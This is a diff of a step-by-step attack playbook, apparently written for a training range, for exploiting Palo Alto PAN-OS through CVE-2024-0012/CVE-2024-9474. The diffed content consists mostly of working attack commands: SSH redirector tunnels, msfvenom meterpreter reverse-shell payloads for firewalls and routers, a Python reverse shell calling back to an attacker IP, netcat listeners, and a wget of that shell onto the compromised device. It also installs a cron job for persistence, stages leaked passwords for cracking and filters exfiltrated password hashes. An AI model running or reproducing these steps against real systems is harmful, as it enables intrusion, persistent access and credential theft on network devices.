@@ -32,61 +32,53 @@ CVE: `CVE-2024-0012` and `CVE-2024-9474`
 
 ### SSH Proxy Chain
 
-#### Terran (104.55.222.X)
-
+#### Terran (104.55.222.X) `On your Attack Box`
+This will create a Dynamic Tunnel (1080) and static (5555) from the attack box to the redirector.
 ```bash
 ssh -N -R 5555:localhost:22 -L 4444:<DJIBOUTI_BOX>:22 -D 1080 kali@<DJIBOUTI_BOX>
 ```
 
 #### Djibouti (102.214.90.X)
-
+If you want to go from your djiboiti redirector back to terran at any point, run the following on the djibouti rediredtor:
 ```bash
 ssh -p 5555 localhost   # connect back to Terran
 ```
 
 #### Terran (104.55.222.X)
-
+Will connect you to the Djibouti redirector.
 ```bash
 ssh -p 4444 localhost   # tunnel to Djibouti
-```
-### Metasploit Payload Setup
-Target all Networking Devices and drop a payload that creates a meterpreter session on each of them:
-
-Make the Payload file for The Palo:
-On your attack box, in the same directory where you saved your scripts, run the following Command. This saves the payload to a file called `netflow.palo` .
-
-``` bash
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your attack IP> LPORT=9729 -f elf > netflow.palo
-```
-
-Next, make the payload file for the vyatta routers:
-In the same directory on your Attack box, run the following command. The payload will be saved to a file called `netflow.vyatta` .
-
-```bash
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<your attack IP> LPORT=6342 -f elf > netflow.vyatta
 ```
 
 ### Exploit Setup
 
 0. WORK ON A NEW BOX, NO TERMINALS OPEN
-1. Create a new folder on your `attack box`
+1. Create a new folder on your `attack box` called `Tools`.
    - This will stage all of the required files and scripts.
-2. Open a text editor (nano) on the attack machine. `sudo nano PoC.py`
-3. Copy PoC.py from your host and paste into VM into the text editor
-   - best case of doing this is utilizing `ClickPaste`
-4. Press `ctrl+O` and then enter to write out the file, then press `ctrl+S` to save, then press `ctrl+X` to exit the program
-5. `chmod +x PoC.py`
+     ```bash
+     mkdir ~/Tools
+     ```
+     
+2. (VM) click on a terminal and type `wget `
+4. (HOST) download `PoC.py` from the github
+5. (HOST) Go to PCTE and go to the file management section
+6. (HOST) on the page go to `upload file`
+7. (HOST) upload `PoC.py`
+8. (HOST) then click on `create a link`
+9. (HOST) `copy link`
+10. (VM) copy the link to your vm in the `commands`
+11. (VM) enter
+12. (VM) mv `weird name it gives you` `Poc.py`
+14. (VM) Enter:
+    ```bash
+    chmod +x PoC.py
+    ```
 
 ### Persistence Script Setup
 
 1. Perform the following command: `nano pan_os_comm`
 2. In nano, copy and paste the below script: **NOTE- BE SURE TO CHANGE THE IP ADDRESS AND PORT IN THE "s.connect(("10.10.100.169", 63842))" LINE TO MATCH THE IP ADDRESS OF YOUR ATTACK MACHINE AND A RANDOM HIGH PORT OF YOUR CHOICE- end note :)** Please remember the random high port you choose as you will have to recall it for use in setting up your initial listener and throwing the export.
 
-#### (ATTACKER MACHINE)
-
-```bash
-nc -lvnp 63842
-```
 
 ```python
 #!/usr/bin/env python3
@@ -101,12 +93,13 @@ os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
 pty.spawn("/bin/bash")
-
 ```
 
-3. Once created, run the following command: `chmod +x pan_os_comm`
 
-### Create your netcat
+### Create your netcat (Attack Box)
+```bash
+nc -lvnp 63842
+```
 
 ### *Host Your Tools Folder On A Web Server*
 
@@ -125,12 +118,18 @@ Through OSINT and recon, we have located a list of compromised passwords from us
 2. Once open, append the below to list of passwords to the to the list.
 
 ```bash
-sudo nano /usr/share/wordlists/rockyou.txt
+touch junk.file
+nano junk.file
 ```
 
-- `(copy and paste the below list)`
-- `Ctrl+O`
-- `ctrl+X`
+copy password list to junk.file
+`ctrl+X`
+
+```bash
+sudo su
+cat junk.file >> /usr/share/wordlists/rockyou.txt
+```
+
 
 #### PASSWORD LIST
 
@@ -242,6 +241,28 @@ KG+Vs7e5$dF4
 
 ```
 
+### Metasploit Payload Setup
+Target all Networking Devices and drop a payload that creates a meterpreter session on each of them:
+Make the Payload file for The Palo:
+On your attack box, in the same directory where you saved your scripts, run the following Command. This saves the payload to a file called `netflow.palo` .
+
+``` bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your attack IP> LPORT=9729 -f elf > netflow.palo
+```
+
+Next, make the payload file for the vyatta routers:
+In the same directory on your Attack box, run the following command. The payload will be saved to a file called `netflow.vyatta` .
+
+```bash
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<your attack IP> LPORT=6342 -f elf > netflow.vyatta
+```
+
+Make the two files executable
+```bash
+chmod +x netflow.palo netflow.vyatta
+```
+
+
 - Now that you are fully set up, move to Phase 1.
 
 ## Phase 1: Initial Access via Palo Alto Exploit
@@ -250,10 +271,10 @@ KG+Vs7e5$dF4
 
 1. Open up your terminal, and if you dont already have 4, go to your terminal preferences and change the settings to start with 4 panes.
 2. In one of the terminal panes, set up your initial lsitener using Netcat to catch the callback shell from the exploit. Be sure to note the port that you are using for this listener, as it will be needed when initiating the exploit.
-   - `nc -lnv 7837`
+   - `nc -lnvp 7837`
 3. In another terminal pane, set up a second listener to catch the beacon once the cron job is set up on the compromised Palo. Use the port provided in the *pan_os_comm* script that was created earlier.
 4. Run the following command to start the second listener:
-   - `nc -lnv 63842`
+   - `nc -lnvp 63842`
 
 ### Section 2. Execute the PoC Script
 
@@ -265,6 +286,7 @@ python PoC.py https://<ip_of_palo_management_interface> <ip_address_of_attack_bo
 
 3. Watch the initial listener pane to ensure it catches the callback from the exploit.
    If you see the following, you have successfully exploited the Palo Alto and now have a limited bash shell into the root of the system:
+   Note: Our listener port will be 7837, as specified earlier in the playbook. Not 9999 as pictured.
 
 ![image](https://github.com/user-attachments/assets/0d3b2d49-fe66-4dcb-80da-51204efebfbc)
 
@@ -275,6 +297,7 @@ python PoC.py https://<ip_of_palo_management_interface> <ip_address_of_attack_bo
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
+
 
 Troubleshooting steps:
 
@@ -304,15 +327,22 @@ ls
 ```
 
 2. Next, import the `pan_os_comm` script from your attack machine, where it is being hosted via the web server.
-   `wget -O /usr/local/bin/pan_os_comm http://<IP_of_your_attack_box>:<port>/pan_os_comm`
+   ```bash
+      wget -O /usr/local/bin/pan_os_comm http://<IP_of_your_attack_box>:80/pan_os_comm
+   ```
 
-3. To ensure that the file has been successfully downloaded and is executable, run:
+3. Once created, run the following command:
+   ```bash
+   chmod +x pan_os_comm
+   ```
+
+5. To ensure that the file has been successfully downloaded and is executable, run:
 
 ```bash
 ls -l /usr/local/bin | grep pan_os
 ```
 
-4. Once you’ve confirmed the script is there, it’s time to set up the cron job to maintain persistence. To add the cron job, execute the following command:
+5. Once you’ve confirmed the script is there, it’s time to set up the cron job to maintain persistence. To add the cron job, execute the following command:
 
 ```bash
 (crontab -l 2>/dev/null; echo "* * * * * /usr/bin/python3 /usr/local/bin/pan_os_comm >/dev/null 2>&1") | crontab -
@@ -386,7 +416,8 @@ In this section, we will leverage the exfiltrated users.txt file that was pulled
 2. Once you are in the correct directory, run the following command to create a new file containing only the valid SHA-256 hashes and usernames from the users.txt file:
 
 ```bash
-grep -E '^\S+:\$5\$' users.txt > valid_hashes.txt
+grep -E '^[^:]+:!?\$[156]\$' users.txt > valid_hashes.txt
+
 ```
 
    This command filters the content of users.txt and extracts the lines that start with valid SHA-256 hashes ($5$), saving them to a new file called valid_hashes.txt.
